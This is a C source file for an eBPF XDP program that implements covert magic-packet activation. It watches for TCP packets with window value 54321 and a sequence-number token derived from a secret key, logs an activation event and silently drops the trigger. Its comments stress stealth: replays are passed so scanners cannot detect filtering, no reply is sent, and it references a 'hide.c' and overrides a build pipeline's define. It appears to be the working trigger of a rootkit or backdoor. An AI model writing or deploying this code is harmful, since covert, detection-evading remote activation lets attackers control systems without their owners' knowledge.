// knock.c — XDP magic-packet activation (port knocking), Phase 2a
//
// Hook : xdp                 (BPF_PROG_TYPE_XDP)
// Maps : knock_key, knock_seen, events   (shared, declared in common.h)
//
// Trigger packet: IPv4/TCP whose 16-bit window field equals AX_KNOCK_PORT
// (54321) and whose sequence number carries a valid token.
//
// ---------------------------------------------------------------------------
// TOKEN / SECRET FOLD  (must be mirrored exactly by the userspace knocker)
// ---------------------------------------------------------------------------
// All arithmetic is done in HOST order:
//
//   fold32   = key[0] | key[1]<<8 | key[2]<<16 | key[3]<<24   (little-endian
//              read of the first 4 bytes of the 16-byte knock_key secret)
//   saddr    = ntohl(iph->saddr)      (source IPv4 address)
//   sport    = ntohs(tcph->source)    (source TCP port)
//   expected = fold32 ^ (saddr & 0xffff) ^ (sport & 0xffff)
//   token    = ntohl(tcph->seq)                       <- carried on the wire
//   hit      = (token == expected)
//
// The knocker therefore sends  seq = htonl(fold32 ^ (saddr & 0xffff) ^ sport).
// The fold is trivially reversible (XOR) and cheap to recompute in userspace;
// note that `saddr`/`sport` values are read from the *received* packet, so the
// knocker must put the value it expects the target to compute for its own
// source address/port — i.e. compute from the same (ip, port) pair the wire
// will carry.
//
// The original spec wrote the fold over the raw network-order fields
// (`ip->saddr & 0xFFFF`, `tcp->source & 0xFFFF`).  Because those are __be
// values, "& 0xFFFF" silently means "low 16 bits of the byte-swapped word",
// i.e. the *high* two octets of the address.  Doing everything in host order
// avoids that trap; the formula's shape is unchanged.
//
// REPLAY POLICY: a repeated token is passed, never dropped.  Dropping replays
// would let a scanner tell that something on the host is filtering by window
// value; only the first packet of each token acts.  A match produces no reply.
// ---------------------------------------------------------------------------

#undef __VMLINUX_H__   /* see hide.c: neutralise the pipeline's -D__VMLINUX_H__ */

#include "common.h"

/* Local copies so we never depend on which uapi enums the BTF dump kept. */
#define AX_ETH_P_IP      0x0800
#define AX_ETH_P_8021Q   0x8100
#define AX_ETH_P_8021AD  0x88a8
#define AX_IPPROTO_TCP   6

#define AX_XDP_ABORTED   0
#define AX_XDP_DROP      1
#define AX_XDP_PASS      2
#define AX_XDP_TX        3
#define AX_XDP_REDIRECT  4

#define AX_BPF_ANY       0

struct ax_vlan_hdr {
    __be16 tci;
    __be16 encap;
};

SEC("xdp")
int ax_knock(struct xdp_md *ctx)
{
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;
    struct ethhdr *eth;
    struct iphdr *ip;
    struct tcphdr *tcp;
    void *nh;
    __u16 proto;
    __u32 ihl;
    __u32 key0 = 0;
    __u32 fold, expected, token;
    unsigned char *k;
    __u8 *seen;
    int i;

    eth = data;
    if ((void *)(eth + 1) > data_end)
        return AX_XDP_PASS;

    proto = eth->h_proto;
    nh = (void *)(eth + 1);

    /* up to two stacked VLAN tags, then IPv4 */
    #pragma unroll
    for (i = 0; i < 2; i++) {
        struct ax_vlan_hdr *vh;

        if (proto != bpf_htons(AX_ETH_P_8021Q) &&
            proto != bpf_htons(AX_ETH_P_8021AD))
            break;
        vh = nh;
        if ((void *)(vh + 1) > data_end)
            return AX_XDP_PASS;
        proto = vh->encap;
        nh = (void *)(vh + 1);
    }

    if (proto != bpf_htons(AX_ETH_P_IP))
        return AX_XDP_PASS;

    ip = nh;
    if ((void *)(ip + 1) > data_end)
        return AX_XDP_PASS;
    if (ip->version != 4)
        return AX_XDP_PASS;

    ihl = (__u32)ip->ihl * 4;
    if (ihl < sizeof(struct iphdr))
        return AX_XDP_PASS;
    if ((void *)ip + ihl > data_end)
        return AX_XDP_PASS;
    if (ip->protocol != AX_IPPROTO_TCP)
        return AX_XDP_PASS;
    if (bpf_ntohs(ip->tot_len) < ihl + sizeof(struct tcphdr))
        return AX_XDP_PASS;
    /* non-first fragment: no usable TCP header */
    if (bpf_ntohs(ip->frag_off) & 0x1fff)
        return AX_XDP_PASS;

    tcp = (void *)ip + ihl;
    if ((void *)(tcp + 1) > data_end)
        return AX_XDP_PASS;
    if (tcp->doff < 5)
        return AX_XDP_PASS;

    if (tcp->window != bpf_htons(AX_KNOCK_PORT))
        return AX_XDP_PASS;

    token = bpf_ntohl(tcp->seq);

    /* Replay: already activated -> pass silently (never drop). */
    seen = bpf_map_lookup_elem(&knock_seen, &token);
    if (seen)
        return AX_XDP_PASS;

    k = bpf_map_lookup_elem(&knock_key, &key0);
    if (!k)
        return AX_XDP_PASS;

    fold = (__u32)k[0] | ((__u32)k[1] << 8) |
           ((__u32)k[2] << 16) | ((__u32)k[3] << 24);
    expected = fold ^ ((bpf_ntohl(ip->saddr) & 0xffff) ^
                       (bpf_ntohs(tcp->source) & 0xffff));

    if (token != expected)
        return AX_XDP_PASS;

    /* First packet of a valid token: report activation, then swallow it. */
    {
        struct ax_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);

        if (e) {
            e->type = AX_EVT_KNOCK;
            e->value = token;
            __builtin_memset(e->msg, 0, sizeof(e->msg));
            bpf_ringbuf_submit(e, 0);
        }
    }

    {
        __u8 one = 1;

        bpf_map_update_elem(&knock_seen, &token, &one, AX_BPF_ANY);
    }

    return AX_XDP_DROP;
}

char LICENSE[] SEC("license") = "GPL";
